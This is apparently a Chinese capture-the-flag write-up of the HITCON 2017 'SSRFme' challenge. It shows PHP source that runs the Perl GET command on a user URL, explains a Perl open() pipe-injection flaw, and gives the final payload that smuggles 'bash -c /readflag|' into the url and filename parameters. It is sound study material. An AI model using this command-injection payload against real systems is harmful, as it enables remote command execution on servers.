# [HITCON 2017]

## 0x01 SSRFme

首页给了代码

```php
<?php
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }

    echo $_SERVER["REMOTE_ADDR"];

    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);

    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);
```

大致就是调用GET命令读URL并保存文件，然而escapeshellarg并不知道怎么逃逸

这个GET命令没见过

查了一下发现是perl写的

有个经典漏洞

> php中shell_exec执行GET命令，而GET命令是通过perl执行的
> perl在open当中可以执行命令，如:
> open(FD, “ls|”)或open(FD, “|ls”)
> 前提是文件需要存在

```
root@kali:~/test# GET 'file:id|'
uid=0(root) gid=0(root) groups=0(root)
```

但是好像因为版本更新了？本地没复现

然后就有了payload

```
/?url=file:bash -c /readflag|&filename=bash -c /readflag|
```

访问两次再访问对应生成的文件就能拿到flag.